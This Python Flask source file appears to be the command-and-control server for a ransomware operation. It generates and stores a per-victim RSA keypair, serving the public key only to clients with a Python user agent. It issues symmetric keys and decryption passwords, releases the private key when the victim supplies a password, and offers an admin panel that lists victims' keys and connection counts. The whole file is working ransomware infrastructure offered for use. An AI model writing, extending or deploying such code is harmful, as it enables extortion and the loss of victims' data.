from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from flask import Flask,request,render_template,redirect,make_response
import base64
import random
import hashlib
import re
import datetime

global ransom_keys
ransom_keys = {}

global ALLOWED_USERS
ALLOWED_USERS = {"admin":"f2d678c3dca032161b7afeae78a471260e8d68cf4d6bbd2c68741d01e27b30c7"} # admin:password

global decryption_keys
decryption_keys = {}

global liste_cookie
liste_cookie = []

global symetric_keys
symetric_keys = {}

global conn
conn = {}

global switchs_ban
switchs_ban = {}

def banned(ip):
    global switchs_ban
    if ip.replace(".","") in switchs_ban.keys():
        if switchs_ban[ip.replace(".","")]==1:
            return True
    return False

def gen_color():
    return f"rgba({random.randint(0,255)},{random.randint(0,255)},{random.randint(0,255)},0.6)"

def hash_pass(passw):
    dk = hashlib.pbkdf2_hmac('sha256', bytes(str(base64.b64encode(bytes(passw,"utf-8"))),'utf-8'), bytes(str("qwerty"),"utf-8"), 100000)
    passwd = dk.hex()
    return passwd

def hashpass(password,username):
    string=f"${username}${password}${username}$"
    return hash_pass(string)

def generate_cookie(username):
    global liste_cookie
    liste_char = [i for i in "AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn$%§?*µ@#&1234567890"]
    cookie_body = "".join([random.choice(liste_char) for _ in range(30)])
    cookie = f"${username}${cookie_body}${username[::-1]}$"
    liste_cookie.append(cookie)
    return cookie

app = Flask(__name__)
@app.route("/")
def index():
    global conn
    if request.remote_addr in conn.keys():
        conn[request.remote_addr]+=1
    else:
        conn[request.remote_addr]=1
    if not "Python" in str(request.user_agent):
        return redirect("/admin/",code=302)
    if request.remote_addr not in ransom_keys.keys():
        print("[+] Sending New")
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=8192,
            backend=default_backend()
        )
        public_key = private_key.public_key()
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )



        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        ransom_keys[request.remote_addr] = [pem,private_pem]
    else:
        print("[+] Sending Current !")
        pem = ransom_keys[request.remote_addr][0]
        private_pem = ransom_keys[request.remote_addr][1]


    return base64.b64encode(pem)

@app.route("/decrypt")
def decrypt():
    global conn
    if request.remote_addr in conn.keys():
        conn[request.remote_addr]+=1
    else:
        conn[request.remote_addr]=1
    password = request.args.get('pass')
    if request.remote_addr in ransom_keys.keys() and password == decryption_keys[request.remote_addr]:
        return ransom_keys[request.remote_addr][1]
    else:
        return "Not Authorized !"

@app.route("/get_sym")
def symetric():
    global conn
    if request.remote_addr in conn.keys():
        conn[request.remote_addr]+=1
    else:
        conn[request.remote_addr]=1
    liste_char = [i for i in "1234567890"]
    key = "".join([random.choice(liste_char) for _ in range(24)])
    global symetric_keys
    symetric_keys[request.remote_addr]=key
    return key

@app.route("/get_hash")
def get_hash():
    global conn
    if request.remote_addr in conn.keys():
        conn[request.remote_addr]+=1
    else:
        conn[request.remote_addr]=1
    if not request.remote_addr in decryption_keys.keys():
        key = "".join([str(random.randint(0,9)) for _ in range(500)])
        print(key)
        passw = hash_pass(key)
        print(passw)
        decryption_keys[request.remote_addr] = key
        return passw
    else:
        return hash_pass(decryption_keys[request.remote_addr])

@app.route("/delete_key/<int:key>/")
def delete_key(key):
    if banned(request.remote_addr):
        return render_template("disallow.html")
    global ransom_keys
    global decryption_keys
    global symetric_keys
    global conn
    if request.remote_addr in conn.keys():
        conn[request.remote_addr]+=1
    else:
        conn[request.remote_addr]=1
    if request.method=="GET":
        if request.cookies.get("keep_connected"):
            if request.cookies.get("keep_connected") not in liste_cookie:
                return redirect("/admin/",code=302)
        else:
            return redirect("/admin/",code=302)

    new_ransom_keys = {}
    for i in ransom_keys.keys():
        if i.replace(".","")!=str(key):
            new_ransom_keys[i]=ransom_keys[i]
    ransom_keys = new_ransom_keys

    new_decryption_keys = {}
    for i in decryption_keys.keys():
        if i.replace(".","")!=str(key):
            new_decryption_keys[i]=decryption_keys[i]
    decryption_keys=new_decryption_keys

    new_symetric_keys = {}
    for i in symetric_keys.keys():
        if i.replace(".","")!=str(key):
            new_symetric_keys[i]=symetric_keys[i]
    symetric_keys=new_symetric_keys

    return redirect("/admin/",code=302)

@app.route("/admin/",methods=["POST","GET"])
def admin_panel():
    if banned(request.remote_addr):
        return render_template("disallow.html")
    global ransom_keys
    global decryption_keys
    global ALLOWED_USERS
    global liste_cookie
    global symetric_keys
    global conn
    global switchs_ban
    print(switchs_ban)
    if request.remote_addr in conn.keys():
        conn[request.remote_addr]+=1
    else:
        conn[request.remote_addr]=1
    if request.method=="GET":
        if request.cookies.get("keep_connected"):
            if request.cookies.get("keep_connected") in liste_cookie:
                for i in conn.keys():
                    if i.replace(".","") not in switchs_ban:
                        switchs_ban[i.replace(".","")]=0
                ransom_keys_return = {i:[str(ransom_keys[i][0]).replace("\\n","<br/>"),str(ransom_keys[i][1]).replace("\\n","<br/>")] for i in ransom_keys.keys()}
                username = request.cookies.get("keep_connected").split("$")[1]
                colors = [gen_color() for _ in conn.keys()]
                values = [int(i) for i in conn.values()]
                keys = [str(i) for i in conn.keys()]
                return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys,conn=conn,colors=colors,keys=keys,values=values,bans=switchs_ban)
        return render_template("login.html")
    elif request.method=="POST":
        if request.cookies.get("keep_connected"):
            if request.cookies.get("keep_connected") in liste_cookie:
                for i in conn.keys():
                    switchs_ban[i.replace(".","")]=[1 if request.values.get(i.replace(".",""))=="on" else 0][0]
                return redirect("/admin/",code=302)
        username = request.values.get("username")
        password = request.values.get("password")
        if username in ALLOWED_USERS.keys():
            if ALLOWED_USERS[username]==hashpass(password,username):
                ransom_keys_return = {i:[str(ransom_keys[i][0]).replace("\\n","<br/>"),str(ransom_keys[i][1]).replace("\\n","<br/>")] for i in ransom_keys.keys()}
                #return render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return)
                expire_date = datetime.datetime.now()
                expire_date = expire_date + datetime.timedelta(hours=1)
                colors = [gen_color() for _ in conn.keys()]
                values = [int(i) for i in conn.values()]
                keys = [str(i) for i in conn.keys()]
                res = make_response(render_template("admin.html",decryption_keys=decryption_keys,ransom_keys=ransom_keys_return,user=username,sym=symetric_keys,conn=conn,colors=colors,keys=keys,values=values,bans=switchs_ban))
                res.set_cookie('keep_connected', generate_cookie(username), expires=expire_date)
                return res

        return render_template("disallow.html")


app.run(threaded=True, port=80, host="0.0.0.0")
